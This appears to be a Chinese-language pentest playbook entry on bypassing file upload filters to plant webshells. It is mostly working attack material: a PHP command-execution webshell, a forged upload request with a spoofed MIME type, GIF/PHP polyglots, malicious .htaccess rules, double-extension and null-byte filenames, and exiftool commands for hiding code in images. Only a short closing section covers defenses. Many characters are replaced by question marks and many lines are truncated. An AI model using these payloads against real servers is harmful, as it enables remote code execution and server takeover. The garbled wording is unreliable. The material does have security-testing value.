# File Upload Restriction Bypass

**ID**: `web-upload-001` | **分类**: web | **风险等级**: high

文件上传限制绕过技术用于在目标系统对上传文件实施扩展名过滤、MIME 类型检查、内容检测等安全措施时，通过伪造文件头、利用解析差异、上传特殊配置文件等方式绕过限制并上传可执行文件。文件上传漏洞的核心在于：成功上传可执行文件（如 PHP/JSP/ASP webshell）后，通过访问该文件在服务器端执行任意代码。现代上传防护通常包含多层检测（扩展名、MIME、文件头、内容），但各层检测之间的不一致性和解析器差异提供了绕过机会

## 触发场景

- 应用提供文件上传功能（头像、文档、图片、附件等
- 上传功能对文件类型进行限制（扩展名白名单/黑名单、MIME 类型检查）
- 上传的文件存储在 Web 可访问目
- 存在文件重命名逻辑但保留原始扩展名
- 使用客户?JavaScript 进行文件类型验证
- 上传目录存在执行权限（如 PHP/JSP/ASP 可被执行?

## 操作检查清单

1. 确定后端技术栈（PHP/Java/Python/Node.js/ASP.NET
2. 确定 Web 服务器类型（Apache/Nginx/IIS
3. 测试基础扩展名过滤：.php?jsp?asp?aspx
4. 测试扩展名大小写?PhP?pHp?PHP
5. 测试扩展名变体：.phtml?php3?php5?phar?inc
6. 测试双扩展名：shell.php.jpg、shell.jpg.php
7. 测试 MIME 类型伪造：Content-Type: image/jpeg
8. 测试文件头伪造（GIF/PHP polyglot
9. 测试 .htaccess ?.user.ini 上传
10. 测试空字节注入：shell.php%00.jpg
11. 测试特殊字符：shell.php.、shell.php_、shell.php;1
12. 上传后验证文件是否可被直接访问和执行

## 技术手段

- 扩展名黑名单绕过：使用未被列入黑名单的可执行扩展
- MIME 类型伪造：修改 Content-Type 请求头绕过服务端检
- 文件头伪造：在可执行文件前添加图片头（GIF89a）绕过内容检
- Polyglot 文件：构造同时满足多种文件格式的文件
- .htaccess 上传：修改目录解析规则使?PHP 文件被当?PHP 执行
- 双扩展名绕过：利用后端解析时取最后一个扩展名的逻辑
- 空字节注入：利用 %00 截断文件名（旧版?PHP/Java
- 大小写绕过：某些系统不区分大小写，但过滤器区
- 特殊字符绕过：shell.php.（Windows 自动去除末尾点）
- Apache 多扩展名解析：shell.php.xyz 可能被解析为 PHP

## 症状

- 上传 .php 文件被拒绝，提示不允许的扩展
- MIME 类型被服务端校验，上?text/x-php 被拒
- 文件内容被检查（如图片文件必须包含有效图片头
- 上传的文件被重命名为随机名或强制更改扩展
- 上传目录配置为不可执行（但可能存在配置错误）

## 根因分析

- 扩展名黑名单不完整（遗漏 .phtml?php5?phar 等变体）
- MIME 类型仅检?Content-Type 请求头（客户端可控）
- 文件头检查只验证前几个字节，后续内容未检
- Web 服务器（Apache/Nginx/IIS）对文件扩展名的解析与后端语言不一
- 上传目录的执行权限配置错误或被攻击者修改（.htaccess
- 文件名未正确过滤，存在空字节注入、双扩展名等绕过方式
- 图像重处理库（GD/ImageMagick）在特定条件下可保留嵌入代码

## 示例

### MIME 类型伪造绕

修改 HTTP 请求?Content-Type 头绕过服务端 MIME 类型检

```
正常请求:
Content-Type: multipart/form-data; boundary=---boundary

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>

绕过请求:
--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>

Burp Suite 操作:
1. 拦截上传请求
2. 修改 filename ?shell.php
3. 修改 Content-Type ?image/jpeg ?image/png
4. 放行请求

原理: 服务端仅检?Content-Type 请求头，该值由客户端完全可控
     这是最常见的上传验证弱?
```

### 扩展名黑名单绕过

当应用使用扩展名黑名单时，使用未被列入的可执行扩展名

```
假设黑名? .php, .jsp, .asp, .aspx

PHP 可执行扩展名变体:
.phtml    - PHP 4/5 支持?HTML+PHP 文件
.php3     - PHP 3 兼容扩展名
.php5     - PHP 5 扩展名
.php7     - PHP 7 扩展名
.phar     - PHP Archive，包含可执行代码
.inc      - ?Apache 当作 PHP 处理（取决于配置）
.cgi      - CGI 脚本

Apache 特殊扩展?
.htaccess - 配置文件（上传后可改变解析规则）
.htpasswd - 密码文件

IIS 扩展?
.asp, .aspx, .cer, .cdx, .asa

Nginx 解析漏洞:
shell.jpg/.php  - Nginx ?/.php 后的部分交给 PHP 处理
shell.jpg%00.php - 空字节截断（旧版本）

原理: 黑名单难以穷举所有可执行扩展名，且不同服务器/版本支持不同
```

### GIF/PHP Polyglot 文件绕过内容检

构造同时是有效 GIF 图片和有?PHP 脚本?polyglot 文件

```
Polyglot 文件:
GIF89a;<?php system($_GET['cmd']); ?>

原理:
- ?6 字节 GIF89a; 是有效的 GIF 文件头
- 分号 ; ?GIF 中是有效字符，在 PHP 中是语句结束符
- <?php 开始的代码?PHP 解析器执行
- 文件同时通过图片内容检查和 PHP 执行

更完整的 Polyglot:
GIF89a
/* <?php */ system($_GET['cmd']); /* ?> */

PNG/PHP Polyglot:
使用工具生成同时?IDAT chunk 中嵌?PHP 代码?PNG 文件

适用场景:
- 服务端同时检查文件头和扩展名
- 使用 getimagesize() 等函数验证图片有效性
- 上传后文件保留原始扩展名或强制为图片扩展?
```

### .htaccess 上传改变解析规则

上传 .htaccess 配置文件修改目录?PHP 解析规则

```
前提: Apache 服务器，上传目录可上?.htaccess 文件

.htaccess 内容:
AddType application/x-httpd-php .jpg
?
AddHandler application/x-httpd-php .jpg

攻击流程:
1. 上传 .htaccess 文件，内容为 AddType application/x-httpd-php .jpg
2. 上传 shell.jpg（包?PHP 代码）
3. 访问 /uploads/shell.jpg，Apache ?.jpg 当作 PHP 执行

其他 .htaccess 技?
php_value auto_prepend_file .htaccess
# <?php system($_GET['cmd']); ?>

原理: .htaccess 可覆?Apache 的默认配置
     AddType 将指定扩展名关联?PHP 处理器
     AddHandler 将指定扩展名注册?PHP 处理器
注意: Nginx 不使?.htaccess，此方法仅对 Apache 有效
```

### 双扩展名绕过

利用后端对扩展名的处理逻辑不一致，使用双扩展名绕过过滤

```
场景 1: 后端只移?检查最后一个扩展名
上传 shell.php.jpg
后端检? .jpg ?允许
Apache 解析: 从右到左识别?php.jpg 可能被当?.php 处理

场景 2: 后端只检?移除第一个扩展名
上传 shell.jpg.php
后端检? .jpg ?允许
实际存储: shell.jpg.php（保?.php 扩展名）

场景 3: Apache 多扩展名解析
Upload shell.php.xxx.yyy
Apache 从左到右匹配，找?.php 后当?PHP 处理

测试矩阵:
shell.php.jpg   shell.php.png   shell.php.gif
shell.jpg.php   shell.png.php   shell.gif.php
shell.php.      (Windows 自动去除末尾?
shell.php_      (下划线替代点)
shell.php%20    (末尾空格)

原理: 不同组件（过滤器、存储系统、Web 服务器）对扩展名的处理逻辑不同
     利用这种不一致性实现绕?
```

### 空字节注入绕

利用空字?(%00) 截断文件名绕过扩展名检

```
Payload:
filename: shell.php%00.jpg
URL 编码: shell.php%2500.jpg
原始字节: shell.php\x00.jpg

攻击流程:
1. 上传文件? shell.php%00.jpg
2. 扩展名检? ?.jpg ?通过
3. 存储到文件系? shell.php（空字节后内容被截断）
4. 访问 /uploads/shell.php 执行代码

适用版本:
- PHP < 5.3.4 (magic_quotes_gpc 关闭?
- 某些 Java 版本 (取决?JVM 和文件系统实?
- 某些 Perl CGI 脚本

变体:
shell.php%00.png
shell.jsp%00.jpg
shell.asp%00.gif

原理: C 字符串以空字节终止，部分文件系统/语言在处理含空字节的路径时
     在空字节处截断，但扩展名检查逻辑可能未做空字节处理
注意: 现代语言版本已修复此问题
```

### 图像文件中嵌?PHP 代码

在合法图片文件中嵌入 PHP 代码，绕过图片内容检

```
方法 1: 在图片末尾追?PHP 代码
cat image.jpg shell.php > malicious.jpg
文件前部是有效的 JPEG，末尾包?PHP 代码

方法 2: 使用 exiftool 在图片元数据中嵌入
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
PHP 代码嵌入到图片的 EXIF 元数据中

方法 3: 使用图像处理库的漏洞
某些版本?ImageMagick/GD 在处理特定图片时保留嵌入代码

验证文件完整?
file malicious.jpg  ?显示?JPEG image data
strings malicious.jpg | grep php  ?显示嵌入?PHP 代码

配合 .htaccess 使用:
1. 上传恶意图片
2. 上传 .htaccess ?.jpg 映射?PHP
3. 访问图片执行嵌入?PHP 代码

适用场景:
- 服务端验证图片有效性（getimagesize、文件头）
- 需要配合扩展名绕过?.htaccess 使用才能执行
```

## 成功标志

- Webshell 可正常执行系统命令（?system("id") 返回结果
- 上传?PHP/JSP/ASP 文件在浏览器中执行而非下载
- .htaccess 生效后，?PHP 扩展名文件被当作 PHP 执行
- Polyglot 文件既通过图片检查又可执行代
- 文件存储?Web 可访问目录且 URL 可预?

## 防御建议

- 使用白名单而非黑名单验证文件扩展名
- 在服务端重新生成文件名（使用 UUID/随机名），不依赖用户提供的文件名
- 同时验证扩展名、MIME 类型、文件头和文件内
- 将上传文件存储在?Web 可访问目录，通过后端脚本代理访问
- 上传目录禁用脚本执行权限（Apache: php_flag engine off, Nginx: location 块限制）
- 对图片进行重新编?缩放处理，破坏嵌入的恶意代码
- 禁止上传 .htaccess?user.ini、web.config 等配置文
- 使用云存储（S3/OSS）并提供预签?URL，避免文件存储在应用服务?
